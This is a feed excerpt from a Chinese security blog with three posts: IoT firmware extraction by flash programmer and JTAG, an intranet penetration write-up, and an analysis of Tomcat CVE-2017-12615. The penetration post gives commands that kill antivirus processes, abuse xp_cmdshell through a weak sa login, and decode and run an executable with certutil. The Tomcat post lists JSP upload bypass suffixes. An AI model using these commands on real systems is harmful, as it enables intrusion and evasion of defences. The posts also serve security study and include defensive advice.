    <title>物联网硬件安全分析基础-固件提取</title>
    <link href="http://www.future-sec.com/iot-security-hardware-obtain.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-obtain.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:47:15.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。<br>为了读取Flash芯片的内容，有以下两种常用方式：</p>
<p>1、直接将导线连接到芯片的引脚，在通过飞线连接编程器，进行在线读取固件；</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image34.jpg" alt=""></p>
<p>2、把芯片拆焊下来，通过烧录座编程器，离线读取固件。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/dce974d6b8fae7f6/20180606_154759.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d35d6e7f9a.jpg" alt=""></p>
<h2 id="飞线法读取"><a href="#飞线法读取" class="headerlink" title="飞线法读取"></a>飞线法读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image36.jpg" alt=""></p>
<h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image37.jpg" alt=""></p>
<p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image38.jpg" alt=""></p>
<p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image39.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image40.jpg" alt=""></p>
<h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image41.jpg" alt=""></p>
<p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image118.jpg" alt=""></p>
<p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image42.jpg" alt=""></p>
<p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image43.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image44.jpg" alt=""></p>
<p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image45.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image46.jpg" alt=""></p>
<p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image116.jpg" alt=""></p>
<h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image47.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image48.jpg" alt=""></p>
<p>通过显微镜发现芯片型号为25L128。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image120.jpg" alt=""></p>
<p>连接编程器读取固件并保存。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image49.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image50.jpg" alt=""></p>
<h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image52.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image119.jpg" alt=""></p>
<p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image51.jpg" alt=""></p>
<p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image54.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image53.jpg" alt=""></p>
<p>在编程器中选择该型号，成功提取出固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image55.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image56.jpg" alt=""></p>
<p>用binwalk解包固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image115.jpg" alt=""></p>
<h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image57.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image58.jpg" alt=""></p>
<p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image59.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image60.jpg" alt=""></p>
<h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image62.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image121.jpg" alt=""></p>
<p>通过夹具连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image61.jpg" alt=""></p>
<p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image63.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image64.jpg" alt=""></p>
<p>用binwalk解包固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image117.jpg" alt=""></p>
<h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>一般情况下，对于TSOP8封装的闪存芯片，可以用上述方法来读取，但可能存在在线读取成功率不高或数据丢失的情况，对于更多引脚和封装格式的芯片，飞线的难度更高，有一定锡焊基础的建议采用拆焊芯片，用烧录座离线读取的方法。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165648.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165631.jpg" alt=""></p>
<p>热风枪设置在适合的温度，吹下芯片，周围的元件可以用铝箔或锡箔纸适当保护。</p>
<p>拆下的闪存芯片放在烧录座上，在连接编程器进行读写，芯片放置的引脚方向要注意对齐编程器和烧录座的第一脚。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165637.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165659.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165651.jpg" alt=""></p>
<p>读取完成，用点焊法把芯片焊上焊盘即可。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165634.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628171222.jpg" alt=""></p>
<p>更多芯片焊接修改操作请参考2.4.2 硬件修改一节</p>
<h2 id="jtag提取固件"><a href="#jtag提取固件" class="headerlink" title="jtag提取固件"></a>jtag提取固件</h2><h3 id="拆焊芯片"><a href="#拆焊芯片" class="headerlink" title="拆焊芯片"></a>拆焊芯片</h3><p>首先用热风枪拆下智能锁主控芯片，该单片机型号为：Stm32F103R6。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3522b3bcebf.jpg" alt=""></p>
<h3 id="烧录座连接Jlink"><a href="#烧录座连接Jlink" class="headerlink" title="烧录座连接Jlink"></a>烧录座连接Jlink</h3><p>芯片第一脚对齐烧录座第一脚，然后把Jlink插入烧录座引出的JTAG接口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b352394427b3.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3523a551154.jpg" alt=""></p>
<h3 id="读取固件"><a href="#读取固件" class="headerlink" title="读取固件"></a>读取固件</h3><p>电脑上安装好Jlink驱动，打开J-Flash客户端，设置好参数，主要在配置栏选择正确的芯片型号，然后点击连接，在点击Target-&gt;Read Back-&gt;Entire trip即可读写固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524c6c08bb.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524ced11a4.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524d65ced7.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524db79b3c.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524f327ac3.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;br&gt;为了读取Flash芯片的内容，有
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>记一次曲折的内网渗透</title>
    <link href="http://www.future-sec.com/network-penetration.html"/>
    <id>http://www.future-sec.com/network-penetration.html</id>
    <published>2017-11-19T16:00:00.000Z</published>
    <updated>2017-11-20T08:29:04.175Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p> 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表：<br><img src="/images/20171120162810.jpg" alt="img"></p>
<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><p>C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道C2的真实IP，主机上面存在各种安全防护软件，各种全家桶，很多命令、脚本和exe都无法运行，比如带有net的命令都无法运行，net、netstat、sc、wscript等</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>目标：获取C2的管理权限，包括网站内容管理和替换等，非单纯的系统权限。<br>1、通过C1利用http隧道或DNS隧道进行socks代理，对C2进行进一步渗透<br>2、抓取C1管理员口令或直接利用当前用户的token进行攻击<br>3、利用数据库或中间件弱口令进行攻击<br>4、利用web漏洞进行攻击，如注入、上传和命令执行等漏洞<br>5、中间人攻击或者嗅探等，但是影响太大，也需等比较久的时间</p>
<h2 id="过河搭桥"><a href="#过河搭桥" class="headerlink" title="过河搭桥"></a>过河搭桥</h2><p>由于是weblogic，无法直接使用http隧道类的代理，因为环境仅支持jspx，没有找到可以用的代理webshell，故采取第二种方案，即通过DNS进行控制和代理。这里我首先想到的自然是cobalt strike的DNS Beacon。</p>
<h2 id="cobalt-strike-dns-beacon-环境构建"><a href="#cobalt-strike-dns-beacon-环境构建" class="headerlink" title="cobalt strike dns beacon 环境构建"></a>cobalt strike dns beacon 环境构建</h2><p>参考：<a href="https://www.cobaltstrike.com/help-dns-beacon" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a> 或自行google</p>
<h2 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h2><p>由于存在360全家桶等，所以得先把他们干掉：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">taskkill /im <span class="number">360</span>* /t /f</div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">taskkill /im KSafeSvc.exe /t /f</div><div class="line">ps:云锁是定制版，这里就不写进程名称了，也不影响远控的执行，安全无法结束也不影响</div></pre></td></tr></table></figure></p>
<p>由于无法上传exe，所以将生成exe重命名为jspx上传，执行之后，等待几分钟，既可以成功上线，这里有个坑，因为内网配置的DNS可能是一些不知名的或者是114之类的，会影响上线，所以这里建议使用8.8.8.8或者119.29.29.29，因为我用的是DNSPOD，修改DNS:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh interface ip set dns "本地连接" source=static addr=119.29.29.29</div></pre></td></tr></table></figure></p>
<h2 id="开启代理"><a href="#开启代理" class="headerlink" title="开启代理"></a>开启代理</h2><p> 参考<a href="https://cobaltstrike.com/help-socks-proxy-pivoting" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a><br> linux可以用Proxychains，windows可以使用Proxifier PE或SocksCap64 </p>
<h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p> 通过jsp大马自带的端口扫描发现C2开放的端口有： 80：WMC生成的html，没啥可搞的 1433：因为C1的mysql账号密码是root/root，因此猜测存在弱口令 8080、8001、8081：就apache的一个代理，没有什么页面和功能 利用socks代理通过1433连接器，sa/sa获取了mssql的DBA权限，暗自高兴了一会，以为道这里就快搞定了，因为系统存在多个web服务，很自然的可以想到，直接可以通过mssql的xp_cmdshell，echo一个一句话就可以搞定了，然而这只是开始。 </p>
<h2 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h2><p>iis环境，可以写一句话，但是所有目录的脚本权限都被禁止，所以这条路也断了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">简单提一下，iis找网站路径的方法</div><div class="line"><span class="number">1.</span> dir/s /b f:\<span class="number">123.</span>jpg (磁盘文件太多时无法使用)</div><div class="line"><span class="number">2.</span> 查看配置文件：</div><div class="line">iis6:type  %systemroot%\system32\inetsrv\metabase.xml|findstr Path=</div><div class="line">iis7/<span class="number">8</span>:type %systemroot%\System32\inetsrv\config\applicationHost.config|findstr physicalPath=</div><div class="line">iis7/<span class="number">8</span>:  appcmd <span class="keyword">list</span> sites</div></pre></td></tr></table></figure></p>
<p>apache环境并没有装php，无法执行php脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic process where name=<span class="string">"httpd.exe"</span> get processid,executablepath,name</div><div class="line">其他中间件或web服务的也可以根据运行程序的路径，查看其配置文件，使用wmic命令查看运行路径:</div></pre></td></tr></table></figure></p>
<p>上远控，远控怎么上传上去呢？于是找到这篇文章<a href="http://www.91ri.org/17255.html" rel="external nofollow noopener noreferrer" target="_blank">《15种文件下载的方式》</a><br>    再win2k3上面能用的，就剩下ftp、vbs、Bitsadmin、smb、c#、hex<br>        vbs和smb都被安全狗限制无法利用<br>        c#编译成功了，但是无法下载，貌似也被限制了<br>        bitsadmin不存在此命令<br>        FTP批量处理下载，C1上面有一个FTP，也是无法成功下载<br>        hex太长转换麻烦，暂时不考虑<br>    刚刚最近国外有大神提到了certutil命令，本地测试了一下，下载的文件无法指定路径，也不能正常保存，故又放弃了此路，详情可以参考这篇<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/" rel="external nofollow noopener noreferrer" target="_blank">文章</a>，win2k3保存有问题</p>
<h2 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h2><p> 经过尝试各种下载姿势，还是无法下载，想了很久，又回到了certutil，因为他是系统自带的命令，从win2k3道windows 2016都是存在的，既可以用于下载，也可以用于base64编码和文件hash校验。故此：<br>通过certutil将生成的exe转换为base64编码，利用echo命令写入到文本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 文件hash</div><div class="line">(<span class="number">1</span>) SHA1</div><div class="line">certutil.exe -hashfile msg.dll</div><div class="line">(<span class="number">2</span>) SHA256：</div><div class="line">certutil.exe -hashfile msg.dll SHA256</div><div class="line">(<span class="number">3</span>) MD5：</div><div class="line">certutil.exe -hashfile msg.dll MD5</div><div class="line"><span class="number">2.</span>编码</div><div class="line">(<span class="number">1</span>) base64编码：</div><div class="line">CertUtil -encode InFile OutFile</div><div class="line">(<span class="number">2</span>) base64解码</div><div class="line">CertUtil -decode InFile OutFile</div><div class="line">注：编码后的文件会添加两处标识信息，不影响文件解码</div><div class="line">文件头：</div><div class="line">-----BEGIN CERTIFICATE-----</div><div class="line">文件尾：</div><div class="line">-----END CERTIFICATE-----</div></pre></td></tr></table></figure></p>
<p>mssql查询分析器批量echo文本保存<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"echo xxxx &gt;&gt; C:\temp\test.txt"</span></div></pre></td></tr></table></figure></p>
<p> 使用certutil还原exe可以还原为txt，因为exe无法写入，并使用其校验文件hash<br>结束相关杀软进程和服务，这里提一点，因为C2的360是自动启动的，所以需要禁用自启，由于sc无法使用，我们可以使用wmic替代：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"taskkill /im 360* /t /f"</span></div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360EntClientSvc' call stopservice"</span></div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360rp' call stopservice"</span></div></pre></td></tr></table></figure></p>
<p>最后运行解码的exe即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CertUtil -decode test.txt xshell.txt</div><div class="line">wmic process call create <span class="string">'c:\temp\xshell.txt'</span></div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 本次渗透，可以说是一波三折，主要学习到的东西是在复杂环境下，综合利用各种windows自带的工具进行绕过安全防护，如wmic、taskkill、certutil等综合运用，才得以绕过杀软的防御，也存在一定运气的成分如数据库弱口令、病毒库更新不及时等。 从防御的角度来看的话：<br>1、加强日常安全运维的巡检，其实我的exe上传不止一次被杀或这被拦截，如果巡检自然可以发现<br>2、提高安全运维人员意识，做好安全策略管理，如数据库弱口令这些本不该有的<br>3、及时更新防病毒软件和恶意代码库，新版的360没法结束<br>4、加强对外恶意流量的安全检测，如DNS、http等</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt; 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="内网渗透" scheme="http://www.future-sec.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat 远程代码执行漏洞分析（CVE-2017-12615）</title>
    <link href="http://www.future-sec.com/tomcat-code-execution.html"/>
    <id>http://www.future-sec.com/tomcat-code-execution.html</id>
    <published>2017-11-19T16:00:00.000Z</published>
    <updated>2017-11-20T07:52:22.019Z</updated>
    
    <content type="html"><![CDATA[<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>环境是Windows 7 64位  Apache Tomcat 7.0.70<br><img src="/images/tom/1.jpg" alt="img"></p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。<br>通过阅读 conf/web.xml 文件，可以发现：<br><img src="/images/tom/2.jpg" alt="img"><br>修改 Tomcat 7.0/conf/web.xml 文件。添加 readonly 属性，设置为false。<br><img src="/images/tom/3.jpg" alt="img"><br>重启tomcat<br>启动 Tomcat，利用 PUT 请求创建文件：<br><img src="/images/tom/4.jpg" alt="img"><br>提示 404。通过所描述的 Windows 受影响，可以结合 Windows 的特性。一是 NTFS 文件流，二是文件名的相关限制（比如 Windows 中文件名不能以空格结尾）来绕过限制：<br><img src="/images/tom/5.jpg" alt="img"><br><img src="/images/tom/6.jpg" alt="img"><br>访问发现可以正常输出：<br><img src="/images/tom/7.jpg" alt="img"></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>本次的tomcat漏洞涉及到DefaultServlet和 JspServlet。<br>Tomcat的Servlet 是在 conf/web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候，是通过JspServlet处理请求的，下面的默认的配置情况：<br><img src="/images/tom/8.jpg" alt="img"><br>而其他的静态文件时通过DefaultServlet处理的，同时DefaultServlet 可以处理 PUT 或 DELETE请求：<br><img src="/images/tom/9.jpg" alt="img"><br>也就是说，除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。<br>从而的得知，即是设置readonly为false，tomcat在默认情况下也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的相关操作，PUT的代码实现只存在于DefaultServlet中。<br>这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。<br>目前主要三种方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">test.jsp%<span class="number">20</span></div><div class="line">test.jsp::$DATA</div><div class="line">test.jsp/   (bypass)</div></pre></td></tr></table></figure></p>
<p>可以得知，“test.jsp ”（末尾有一个和空格即“test.jsp%20”）和“test.jsp::$DATA<br>”并不能匹配到 JspServlet，而是会交由DefaultServlet去处理。当处理 PUT 请求时：<br><img src="/images/tom/10.jpg" alt="img"><br>主要是doPut，这里tomcat开始处理PUT请求，可以看到这里如果readonly是true就直接进入error了，所以在前面的步骤中需要设置成false。<br><img src="/images/tom/11.jpg" alt="img"><br>会调用resources.bind：<br><img src="/images/tom/12.jpg" alt="img"><br><img src="/images/tom/13.jpg" alt="img"><br>而继续调用dirContext.bind<br><img src="/images/tom/14.jpg" alt="img"><br>真正写入文件在FileDirContext.java的rebind函数里<br><img src="/images/tom/15.jpg" alt="img"><br>又由于 Windows 不允许“ ”（此处为一个空格）作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。<br>FileOutputStream特性<br>到这里是否会想，当请求jsp%20或是jsp::$DATA后缀的时候，为什么最终却写入.jsp后缀的文件?<br>这些其实是java.io. FileOutputStream的问题了，需要进一步分析jdk的C代码才能得到解答，如图<br><img src="/images/tom/16.jpg" alt="img"><br>跟进去FileOutputStream<br><img src="/images/tom/17.jpg" alt="img"><br>跟进去open<br><img src="/images/tom/18.jpg" alt="img"><br>跟到open是native的，不是java层面的问题了，这里open实际上是一个jni接口，然后调用windows API CreateFileW创建文件，这里下载openjdk6的jdk代码进行分析，如图:<br><img src="/images/tom/19.jpg" alt="img"><br>FileOutputStream_md.c<br>这里Java_java_io_FileOutputStream_open便是上面java代码里open函数的C代码实现，其中参数path对应open函数的name变量，继续跟踪，如图:<br><img src="/images/tom/20.jpg" alt="img"><br>io_util_md.c<br>继续跟进去winFileHandleOpen，这里最终调用windows的CreateFileW实现文件创建，如图：<br><img src="/images/tom/21.jpg" alt="img"><br>io_util_md.c<br>而在windows下，创建文件是对后缀名称进行处理的，例如：如果后缀末尾是空格，会被去掉，a.txt::$DATA传入CreateFileW也会被处理成a.txt</p>
<h2 id="Bypass-分析"><a href="#Bypass-分析" class="headerlink" title="Bypass 分析"></a>Bypass 分析</h2><p>然而，当 PUT 地址为/test.jsp/时，仍然会创建 JSP，会影响 Linux 和 Windows 服务器，并且 Bypass 了之前的补丁，分析如下。<br>在进入 bind 函数时，会声明一个 File 变量：<br><img src="/images/tom/22.jpg" alt="img"><br>进入 File 后，会对 name 进行 normalize  (在file.class)<br><img src="/images/tom/23.jpg" alt="img"><br>继续跟入<br><img src="/images/tom/24.jpg" alt="img"><br>在这里这个normalize(path, n, (prev == slash) ? i - 1 : i)会将文件名末尾的/过滤掉，所以可以导致后面文件写入jsp文件。</p>
<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>由于存在去掉最后的 / 的特性，那么这个漏洞自然影响 Linux 以及 Windows 版本。而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 都会受到影响。目前来说，最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，（默认设置是false）。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;环境是Windows 7 64位  Apache Tomcat 7.0.70&lt;br&gt;&lt;img src=&quot;/images/to
    
    </summary>
    
      <category term="系统安全" scheme="http://www.future-sec.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Tomcat" scheme="http://www.future-sec.com/tags/Tomcat/"/>
    
